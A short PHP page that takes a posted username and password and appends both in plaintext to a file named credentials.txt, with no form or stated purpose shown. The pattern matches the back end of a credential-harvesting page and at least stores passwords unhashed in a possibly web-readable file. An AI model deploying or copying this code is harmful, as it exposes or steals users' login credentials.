<html>
  <body>
    <?php
      if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = filter_var($_POST["username"], FILTER_SANITIZE_STRING);
        $password = filter_var($_POST["password"], FILTER_SANITIZE_STRING);

        $file = fopen("credentials.txt", "a");

        if (fwrite($file, $username . "\n") === FALSE) {
          /* Handle error */
          echo "Error: " . error_get_last()['message'];
        }

        if (fwrite($file, $password . "\n") === FALSE) {
          /* Handle error */
          echo "Error: " . error_get_last()['message'];
        }

        fclose($file);
      }
    ?>
  </body>
</html>
